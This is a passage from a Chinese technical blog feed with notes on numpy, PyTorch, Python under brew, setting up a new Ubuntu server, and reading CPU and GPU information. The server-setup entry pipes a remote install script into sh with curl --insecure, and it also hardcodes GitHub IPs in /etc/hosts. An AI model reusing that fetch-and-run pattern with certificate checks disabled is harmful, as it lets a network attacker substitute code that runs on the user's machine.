id="矩阵和随机数">矩阵和随机数</h2><p>numpy.matrix</p><p>matrix(字符串/列表/元组/数组) / mat(字符串/列表/元组/数组)当参数为字符串时，各个元素之间空格分割，不同行用分号分割。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">128</span>]: a=np.mat(<span class="string">&quot;1 2 3;4 5 6&quot;</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">129</span>]: a</span><br><span class="line">Out[<span class="number">129</span>]:</span><br><span class="line">matrix([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">        [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]])</span><br><span class="line">In [<span class="number">131</span>]: a=np.array([[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]])</span><br><span class="line">In [<span class="number">133</span>]: m=np.mat(a)</span><br><span class="line"></span><br><span class="line">In [<span class="number">134</span>]: m</span><br><span class="line">Out[<span class="number">134</span>]:</span><br><span class="line">matrix([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">        [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]])</span><br><span class="line"></span><br><span class="line">In [<span class="number">135</span>]: <span class="built_in">type</span>(a), <span class="built_in">type</span>(m)</span><br><span class="line">Out[<span class="number">135</span>]: (numpy.ndarray, numpy.matrix)</span><br></pre></td></tr></table></figure><p>矩阵对象, 同样具备 ndim，shape，size，dtype 属性。</p><h3 id="矩阵运算">矩阵运算</h3><p>矩阵之间乘号是矩阵相乘。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">In [140]: a1,a2</span><br><span class="line">Out[140]:</span><br><span class="line">(matrix([[0, 1],</span><br><span class="line">         [2, 3]]),</span><br><span class="line"> matrix([[1, 1],</span><br><span class="line">         [2, 0]]))</span><br><span class="line"></span><br><span class="line">In [141]: a3=a1*a2</span><br><span class="line"></span><br><span class="line">In [142]: a3</span><br><span class="line">Out[142]:</span><br><span class="line">matrix([[2, 0],</span><br><span class="line">        [8, 2]])</span><br></pre></td></tr></table></figure><p>矩阵转置：<code>.T</code>， 矩阵求逆：<code>.I</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">144</span>]: a1.T</span><br><span class="line">Out[<span class="number">144</span>]:</span><br><span class="line">matrix([[<span class="number">0</span>, <span class="number">2</span>],</span><br><span class="line">        [<span class="number">1</span>, <span class="number">3</span>]])</span><br><span class="line"></span><br><span class="line">In [<span class="number">145</span>]: a1.I</span><br><span class="line">Out[<span class="number">145</span>]:</span><br><span class="line">matrix([[-<span class="number">1.5</span>,  <span class="number">0.5</span>],</span><br><span class="line">        [ <span class="number">1.</span> ,  <span class="number">0.</span> ]])</span><br></pre></td></tr></table></figure><h2 id="矩阵-vs-二维数组">矩阵 vs 二维数组</h2><p>numpy 中的矩阵和二维数组相似，在很多时候是通用的</p><table><thead><tr class="header"><th>矩阵</th><th>二维数组</th></tr></thead><tbody><tr class="odd"><td>运算符号简单; A*B</td><td>能够表示高维数组; 数组更加灵活，速度更快</td></tr></tbody></table><h3 id="随机数">随机数</h3><table><colgroup><col style="width: 41%" /><col style="width: 51%" /><col style="width: 6%" /></colgroup><thead><tr class="header"><th>函数</th><th>功能描述</th><th>返回值</th></tr></thead><tbody><tr class="odd"><td>np.random.rand(d1,.,dn)</td><td>元素在[0,1)区间均匀分布的数组</td><td>浮点数</td></tr><tr class="even"><td>np.random.uniform(low,high,size)</td><td>元素在[low,high)区间均匀分布的数组</td><td>浮点数</td></tr><tr class="odd"><td>numpy.random.randint(low,high, size)</td><td>元素在[low,high)区间均匀分布的数组</td><td>整数</td></tr><tr class="even"><td>np.random.randn(d0,.,dn)</td><td>产生标准正态分布的数组</td><td>浮点数</td></tr><tr class="odd"><td>np.random.normal(loc, scale, size)</td><td>产生均值为 loc，方差为 scale 的正态分布的数组</td><td>浮点数</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [27]: np.random.normal(0,1,(3,2))</span><br><span class="line">Out[27]:</span><br><span class="line">array([[-2.01119139, -0.66620011],</span><br><span class="line">       [-1.61697634, -1.14187373],</span><br><span class="line">       [-0.51972518, -1.73302281]])</span><br></pre></td></tr></table></figure><p>伪随机数：由随机种子，根据一定的算法生成的。随机种子：指定随机数生成时所用算法开始的整数值。</p><ol type="1"><li>如果使用相同的 seed（）值，则每次生成的随即数都相同。</li><li>如果不设置这个值，则系统根据时间来自己选择这个值，此时每次生成的随机数因时间差异而不同。</li><li>采用 seed（）函数设置随机种子，仅一次有效。</li><li>随机数产生的算法，和系统有关。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">np.random.seed(num) 设置随机数种子</span><br><span class="line">np.random.shuffle(序列) # 打乱序列顺序，对于多维数组，只打乱第一维</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>numpy 知识点</title>
      <link href="/blog/2022/06/15/programming/python/ai/np_skills/"/>
      <url>/blog/2022/06/15/programming/python/ai/np_skills/</url>
      
        <content type="html"><![CDATA[<h1 id="numpy-tips">Numpy Tips</h1><h2 id="数据存储大小">数据存储大小</h2><p>对于单个数据类型而言：对于 np.int, np.float等，不指明位数的类型，依赖于平台是 32 位还是 64 位。对于 np.int32,np.float64 等指明位数的类型，字节数便是其指明的位数/8，比如：np.int32数据存储占用 4 bytes, np.float64 数据存储占用 8 bytes。</p><p>对于数组而言，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">In [39]: a</span><br><span class="line">Out[39]:</span><br><span class="line">array([[1.2, 1.3],</span><br><span class="line">       [0. , 0. ]])</span><br><span class="line"></span><br><span class="line">In [40]: a.dtype</span><br><span class="line">Out[40]: dtype(&#x27;float64&#x27;)</span><br><span class="line"></span><br><span class="line">In [41]: a.itemsize</span><br><span class="line">Out[41]: 8</span><br><span class="line"></span><br><span class="line">In [42]: a.nbytes</span><br><span class="line">Out[42]: 32</span><br><span class="line"></span><br><span class="line">In [43]: a.size</span><br><span class="line">Out[43]: 4</span><br><span class="line"></span><br><span class="line">In [44]: a.itemsize * a.size</span><br><span class="line">Out[44]: 32</span><br><span class="line"></span><br><span class="line">In [45]: a.itemsize * a.size == a.nbytes</span><br><span class="line">Out[45]: True</span><br></pre></td></tr></table></figure><p>arr.nbytes = arr.itemsize * arr.size arr.itemsize返回一个数组元素的字节大小 arr.size 返回数组元素的个数 arr.size=np.prod(arr.shape) arr.nbytes 返回整个数组存储数据所需要的字节大小</p><p>nbytes： Total bytes consumed by the elements of the array. Does notinclude memory consumed by non-element attributes of the arrayobject.</p><p>注：<code>sys.getsizeof</code> 返回任意 python对象的内存占用大小，一个 numpy 数组所占用的内存=数组的数据存储 +overhead（shape，dtype，strides）等相关信息，overhead对于大数组来说，可以忽略不计。</p><h2 id="参考">参考：</h2><p><ahref="https://stackoverflow.com/questions/9395758/how-much-memory-is-used-by-a-numpy-ndarray">python- How much memory is used by a numpy ndarray? - Stack Overflow</a> <ahref="https://stackoverflow.com/questions/35421869/nbytes-and-getsizeof-return-different-values">python- nbytes and getsizeof return different values - Stack Overflow</a></p><h2 id="数据存储类型以及大小端">数据存储类型以及大小端</h2><p>大端字节序（big endian）和小端字节序（little endian）</p><p>Endian-ness.</p><p>MSB stands for most significant bit, while LSB is least significantbit. In binary terms, the MSB is the bit that has the greatest effect onthe number, and it is the left-most bit.</p><p>Little-endian (LSB first) means we start with the least significantpart in the lowest address.</p><p>Big-endian (MSB first) means we start with the most significant part.大端模式，是指数据的高字节位保存在内存的低地址中，而数据的低字节位保存在内存的高地址中。这样的存储模式有点儿类似于把数据当作字符串顺序处理。大端模式顺序跟字符串一样。左边是低地址，然后顺序和我们日常书写一样。</p><p>numpy 的 dtype 可以简要指定大小端以及类型，叫做 One-characterstrings/Array-protocol type strings.每一个类型都有一个缩写字母与之对应。</p><p>大小端表示：</p><p><ahref="https://numpy.org/doc/stable/reference/generated/numpy.dtype.byteorder.html">numpy.dtype.byteorder— NumPy v1.24 Manual</a></p><p>‘=’ ：native， ‘&lt;’：little-endian， ‘&gt;’：big-endian， ‘|’：notapplicable</p><p>dt = np.dtype('&lt;i4') # 32-bit little-endian signed integer dt =np.dtype('&gt;f8') # 64-bit big-endian floating-point number, np.float64dt = np.dtype('c16') # 128-bit complex floating-point number dt =np.dtype('a25') # 25-length zero-terminated bytes dt = np.dtype('U25') #25-character string</p><p>字母后面数字是字节数</p><p><ahref="https://numpy.org/doc/stable/reference/arrays.dtypes.html">Datatype objects (dtype) — NumPy v1.24 Manual</a></p><h2 id="矩阵分块乘积">矩阵分块乘积</h2><p>矩阵分块乘法，使用 np.tensordot 指定约减 axis （10，3） （3，2，3）-&gt; (10,2,3)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">np.tensordot(arr_a, arr_b, axes=((<span class="number">1</span>), (<span class="number">0</span>))) <span class="comment"># return eval_ys</span></span><br></pre></td></tr></table></figure><h2 id="numpy-padding">numpy padding</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">random_pad</span>(<span class="params">vec, pad_width, *_, **__</span>):</span><br><span class="line">            vec[:pad_width[<span class="number">0</span>]] = np.random.randint(<span class="number">0</span>, p, size=pad_width[<span class="number">0</span>])</span><br><span class="line">            vec[vec.size-pad_width[<span class="number">1</span>]:] = np.random.randint(<span class="number">0</span>,p, size=pad_width[<span class="number">1</span>])</span><br><span class="line">            np.pad(img, (<span class="number">0</span>,<span class="number">1</span>), mode=random_pad) <span class="comment"># add 1 additional row in axis-0</span></span><br></pre></td></tr></table></figure><p>pytorch 中的 torch.repeat()函数与 numpy.tile() 功能相似</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>brew 管理 python</title>
      <link href="/blog/2022/06/15/programming/python/configurations/brew_python/"/>
      <url>/blog/2022/06/15/programming/python/configurations/brew_python/</url>
      
        <content type="html"><![CDATA[<h1 id="brew-管理-python">brew 管理 python</h1><h2 id="多版本共存">多版本共存</h2><p>brew unlink python@3.8 brew link python@3.7</p><p>然后，根据提示 export 到 zshrc 环境变量</p><h2 id="完全卸载-python-包与依赖">完全卸载 python 包与依赖</h2><p><ahref="https://apple.stackexchange.com/questions/273774/my-mac-has-python3-and-2-7-installed-how-do-i-uninstall-python3-but-keep-2-7">MyMac has Python3 and 2.7 installed. How do I uninstall Python3 but keep2.7?</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Pytorch 使用知识点</title>
      <link href="/blog/2022/06/15/programming/python/pytorch/torch_skills/"/>
      <url>/blog/2022/06/15/programming/python/pytorch/torch_skills/</url>
      
        <content type="html"><![CDATA[<p>PyTorch tensors are mutable, which means that they can be modified inplace. tensor 是 mutable object，和 list一样，因此在函数传参后，在函数里面时，需要注意是修改原来的tensor，还是返回新的。</p><ol type="1"><li><p>Varible and tensor: Varible 是旧版的 torch 的变量, 等价于tensor</p></li><li><p><code>b = a if torch.is_tensor(a) else torch.tensor(a)</code></p></li><li><p>Pytorch 与 numpy 的 Tensor 与 arrary 类型转换</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">torch.from_numpy(a_array)</span><br><span class="line">a_tenosr.numpy()</span><br></pre></td></tr></table></figure></p></li><li><p>numpy 与 torch 的浮点数默认位数不同</p><p>numpy 浮点数默认使用 64 位， torch 的浮点数默认使用 32 位</p><p>Default dtype:</p><ol type="1"><li><p>PyTorch torch.float32<code>torch.set_default_dtype(torch.float64)</code> to compatible withtensor.numpy() defauly np.float64</p></li><li><p>numpy <code>np.float64</code> <code>int_</code>: Default integertype (same as C long; normally either int64 or int32)</p></li></ol></li><li><p>shuffle tensor</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">indexes = torch.randperm(data.shape[0])</span><br><span class="line">data = data[indexes]</span><br></pre></td></tr></table></figure></p><p><ahref="https://stackoverflow.com/questions/61744621/randomly-shuffling-torch-tensor">shuffle- Randomly shuffling torch tensor - Stack Overflow</a></p></li><li><p>random tensor</p><p>torch.tensor 默认初始化类型 torch.float/torch.FloatTensor: float类型, 后者是 CPU float 类型</p><p><code>torch.float(*(a, b, c)).uniform_(0, 100)</code></p></li><li><p>is 和 ==</p><p>identity operator (is) and the equality operator (==)</p><p>is 是用来检查是否是一个地址的数据</p><p><code>is not</code> 不能当成 <code>!=</code> 用</p><p><ahref="https://realpython.com/python-is-identity-vs-equality/">Python'!=' Is Not 'is not': Comparing Objects in Python – RealPython</a></p></li><li><p>Reproducibility fix randomness</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">random.seed(<span class="number">0</span>)</span><br><span class="line">torch.manual_seed(<span class="number">0</span>)</span><br><span class="line">np.random.seed(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></p><p><ahref="https://pytorch.org/docs/stable/notes/randomness.html">Reproducibility— PyTorch 1.13 documentation</a></p></li><li><p>pytorch 和 numpy 中最大和最小值</p></li></ol><p>pytorch 中 <code>torch.iinfo</code>, <code>torch.finfo</code>,<code>np.iinfo</code>, <code>np.finfo</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">In [93]: np.iinfo(np.int64)</span><br><span class="line">Out[93]: iinfo(min=-9223372036854775808, max=9223372036854775807, dtype=int64)</span><br><span class="line"></span><br><span class="line">In [94]: torch.iinfo(torch.int64)</span><br><span class="line">Out[94]: iinfo(min=-9.22337e+18, max=9.22337e+18, dtype=int64)</span><br><span class="line"></span><br><span class="line">In [95]: torch.finfo(torch.float64)</span><br><span class="line">Out[95]: finfo(resolution=1e-15, min=-1.79769e+308, max=1.79769e+308, eps=2.22045e-16, smallest_normal=2.22507e-308, tiny=2.22507e-308, dtype=float64)</span><br><span class="line"></span><br><span class="line">In [96]: np.iinfo(np.int64)</span><br><span class="line">Out[96]: iinfo(min=-9223372036854775808, max=9223372036854775807, dtype=int64)</span><br><span class="line"></span><br><span class="line">In [97]: np.iinfo(np.int64).max</span><br><span class="line">Out[97]: 9223372036854775807</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>新服务器配置</title>
      <link href="/blog/2022/05/30/linux/newserver_config/"/>
      <url>/blog/2022/05/30/linux/newserver_config/</url>
      
        <content type="html"><![CDATA[<h1 id="新服务器配置">新服务器配置</h1><ol type="1"><li><p>查看自己发行版与版本 <code>lsb_release -a</code></p><p>Linux 内核版本 版本号码 稳定版本：2.4.32 开发版本：2.5.19-6主版本号.稳定(稳定)/开发版本(奇).发布号-patch 号</p></li><li><p>修改密码<code>sudo passwd user(user 是对应的用户名)</code></p></li><li><p>换源 注意：在下拉菜单选择对应的 Ubuntu 版本 <ahref="https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/">ubuntu |镜像站使用帮助 | 清华大学开源软件镜像站 | Tsinghua Open SourceMirror</a></p></li><li><p>更新系统</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br></pre></td></tr></table></figure></p></li><li><p>安装 <code>git wget curl tmux</code>等</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install vim git wget curl tmux zip</span><br></pre></td></tr></table></figure></p></li><li><p>改 host 便于上 github</p><p>使用 <code>ipaddress.com</code> 这个网站查找相应域名的 IP 地址，修改HOST 文件 <code>sudo vim /etc/hosts</code></p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">199.232.69.194 https://github.global.ssl.fastly.net</span><br><span class="line">140.82.114.4 github.com</span><br><span class="line">140.82.114.4 gist.github.com</span><br></pre></td></tr></table></figure></p></li><li><p>配置 git 连接 github</p></li></ol><blockquote><ol start="8" type="1"><li>如果虚拟机需要安装 vmtool</li></ol></blockquote><pre><code>注意：先安装好Ubuntu虚拟机，再安装 vmtool，ubuntu 安装过程中会对 iso CD-ROM 进行锁定[2020最新版VMware安装Ubuntu20.04教程(巨细)！ - 知乎](https://zhuanlan.zhihu.com/p/141033713)</code></pre><h2 id="常用工具">常用工具</h2><p>安装 python3, python3-pip</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python3.9 python3-pip</span><br></pre></td></tr></table></figure><h2 id="安装-zsh-和-oh-my-zsh">安装 zsh 和 oh-my-zsh</h2><p>安装 zsh: <code>sudo apt install zsh</code> 下载oh-my-zsh：<code>sh -c "$(curl --insecure -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)"</code></p><p>修改主题，增加插件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.zshrc</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改 ZSH_THEME=<span class="string">&quot;robbyrussell&quot;</span> 为 ZSH_THEME=<span class="string">&quot;ys&quot;</span></span></span><br><span class="line">source ~/.zshrc</span><br></pre></td></tr></table></figure><p>安装插件 zsh-suggestions, zsh-syntax-highlighting</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/zsh-users/zsh-syntax-highlighting.git $&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;/plugins/zsh-syntax-highlighting</span><br><span class="line">git clone https://github.com/zsh-users/zsh-autosuggestions $&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;/plugins/zsh-autosuggestions</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改 ~/.zshrc：</span></span><br><span class="line">plugins=(git zsh-syntax-highlighting zsh-autosuggestions)</span><br><span class="line">source ~/.zshrc</span><br></pre></td></tr></table></figure><h2 id="安装">安装</h2><p><code>sudo apt-get install inetutils-ping net-tools</code>上述命令是安装 ping and ifconfig 工具</p><h2 id="安装开发环境">安装开发环境</h2><h2 id="install-nvidia-cuda-toolkit-using-apt">Installnvidia-cuda-toolkit Using apt</h2><p><code>sudo apt update</code>：Update apt database with apt using thefollowing command.</p><p>After updating apt database, We can install nvidia-cuda-toolkit usingapt by running the following command:</p><p><code>sudo apt -y install nvidia-cuda-toolkit</code></p><h2 id="显卡常规测试">显卡常规测试</h2><p><code>systemd-detect-virt -c</code></p><p>如果输出为 none，则说明是物理机。</p><p><a href="http://www.njtst.com/allnews/shownews.php?id=6">显卡常规检测GPUBURN gpu-burn 测试显卡步骤</a></p><h2 id="install-miniconda">install miniconda</h2><pre><code><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh</span><br><span class="line">bash Miniconda3-latest-Linux-x86_64.sh</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">之后认真看每一步骤和后面输出的，会教你如何在shell中激活conda</span></span><br><span class="line">export PATH=/home/your_user_name/miniconda/bin:$PATH #临时激活</span><br><span class="line">conda config --set auto_activate_base false</span><br><span class="line">conda init zsh # 将激活写入shell的配置文件</span><br></pre></td></tr></table></figure>To initialize your shell, run `conda init &lt;SHELL_NAME&gt;`Currently supported shells are:- bash- fish- tcsh- xonsh- zsh- powershell</code></pre><h2 id="参考资料">参考资料</h2><p><ahref="https://docs.conda.io/projects/conda/en/latest/user-guide/install/linux.html">Installingon Linux — conda 4.13.0.post1+0adcd595 documentation</a> <ahref="https://astrobiomike.github.io/unix/conda-intro">An introductionto Conda</a></p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu 查看 CPU 和 GPU</title>
      <link href="/blog/2022/05/30/linux/cpu_gpu/"/>
      <url>/blog/2022/05/30/linux/cpu_gpu/</url>
      
        <content type="html"><![CDATA[<h2 id="gpu">GPU</h2><blockquote><p>GPU 占用率高好，CPU 占用率高不好 CPU是多任务环境应用（要跑系统，要跑程序，背景可能还要有其他任务，读盘，分配资源等）；GPU是单任务环境应用，只有图形计算一个工作（对用户来说，一次运行一个游戏或者一个dl 训练任务），且帧数是没有上限的，帧率越高体验越好。所以 CPU占用越低越可以给其他任务留出性能冗余，保证整体反应速度和流畅性。GPU利用率越高效率越高，让它尽量一直干活</p></blockquote><ol type="1"><li><p>查看 GPU 占用：<code>nvidia-smi</code></p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">root@e232f:/home/# nvidia-smi</span><br><span class="line">Mon May 30 02:45:53 2022</span><br><span class="line">+-----------------------------------------------------------------------------+</span><br><span class="line">| NVIDIA-SMI 510.68.02    Driver Version: 510.68.02    CUDA Version: 11.6     |</span><br><span class="line">|-------------------------------+----------------------+----------------------+</span><br><span class="line">| GPU  Name        Persistence-M| Bus-Id        Disp.A | Volatile Uncorr. ECC |</span><br><span class="line">| Fan  Temp  Perf  Pwr:Usage/Cap|         Memory-Usage | GPU-Util  Compute M. |</span><br><span class="line">|                               |                      |               MIG M. |</span><br><span class="line">|===============================+======================+======================|</span><br><span class="line">|   0  NVIDIA GeForce ...  Off  | 00000000:3B:00.0 Off |                  N/A |</span><br><span class="line">|  0%   30C    P8    21W / 350W |   2189MiB / 12288MiB |      0%      Default |</span><br><span class="line">|                               |                      |                  N/A |</span><br><span class="line">+-------------------------------+----------------------+----------------------+</span><br><span class="line">|   1  NVIDIA GeForce ...  Off  | 00000000:AF:00.0 Off |                  N/A |</span><br><span class="line">| 30%   26C    P8    17W / 350W |   2195MiB / 24576MiB |      0%      Default |</span><br><span class="line">|                               |                      |                  N/A |</span><br><span class="line">+-------------------------------+----------------------+----------------------+</span><br><span class="line"></span><br><span class="line">+-----------------------------------------------------------------------------+</span><br><span class="line">| Processes:                                                                  |</span><br><span class="line">|  GPU   GI   CI        PID   Type   Process name                  GPU Memory |</span><br><span class="line">|        ID   ID                                                   Usage      |</span><br><span class="line">|=============================================================================|</span><br><span class="line">+-----------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure></p><p>第一行：NVIDIA-SMI 版本， 已经安装的 NVIDIA驱动版本，已安装驱动可以支持的最新的 CUDA 版本，新的驱动可以支持旧版本的CUDA。 <strong>注：这里并不能说是否安装了 CUDA</strong> <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20220530104903.png"alt="20220530104903" /> GPU: GPU index fan: Fan speed (0%-100%), N/Ameans no fan</p></li><li><p>查看 GPU 编号：<code>nvidia-smi -L</code></p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@e2a435:/home/# nvidia-smi -L</span><br><span class="line">GPU 0: NVIDIA GeForce RTX 3080 Ti (UUID: GPU-42432a6b-5820-e116-181b-cfd5c9c2d35e)</span><br><span class="line">GPU 1: NVIDIA GeForce RTX 3090 (UUID: GPU-9c3bdbff-5619-1d07-579d-e5892c950959)</span><br></pre></td></tr></table></figure></p></li><li><p>结合 watch 刷新</p><p><code>watch -n 60 -d nvidia-smi</code> <code>-n</code>:指定刷新秒数，<code>-d</code>: 高亮变化的地方</p></li></ol><h2 id="cpu">CPU</h2><h3 id="lscpu-查看-cpu-信息">lscpu 查看 CPU 信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">lscpu</span></span><br><span class="line">Architecture: x86_64</span><br><span class="line">CPU op-mode(s): 32-bit, 64-bit</span><br><span class="line">Byte Order: Little Endian</span><br><span class="line">Address sizes: 46 bits physical, 48 bits virtual</span><br><span class="line">CPU(s): 96</span><br><span class="line">On-line CPU(s) list: 0-95</span><br><span class="line">Thread(s) per core: 2</span><br><span class="line">Core(s) per socket: 24</span><br><span class="line">Socket(s): 2</span><br><span class="line">NUMA node(s): 2</span><br><span class="line">Vendor ID: GenuineIntel</span><br><span class="line">CPU family: 6</span><br><span class="line">Model: 85</span><br><span class="line">Model name: Intel(R) Xeon(R) Platinum 8259CL CPU @ 2.50GHz</span><br><span class="line">Stepping: 7</span><br><span class="line">CPU MHz: 1200.147</span><br><span class="line">CPU max MHz: 3500.0000</span><br><span class="line">CPU min MHz: 1200.0000</span><br><span class="line">BogoMIPS: 5000.00</span><br><span class="line">Virtualization: VT-x</span><br><span class="line">L1d cache: 1.5 MiB</span><br><span class="line">L1i cache: 1.5 MiB</span><br><span class="line">L2 cache: 48 MiB</span><br><span class="line">L3 cache: 71.5 MiB</span><br><span class="line">NUMA node0 CPU(s): 0-23,48-71</span><br><span class="line">NUMA node1 CPU(s): 24-47,72-95</span><br></pre></td></tr></table></figure><p>“CPU(s): 96” represents the number of logical cores, which equals“Thread(s) per core” × “Core(s) per socket” × “Socket(s)”. One socket isone physical CPU package (which occupies one socket on the motherboard);each socket hosts a number of physical cores, and each core can run oneor more threads.</p><p>In my case, I have two sockets, each containing a 24-core Xeon 8259CLCPU, and since that supports hyper-threading with two threads, each corecan run two 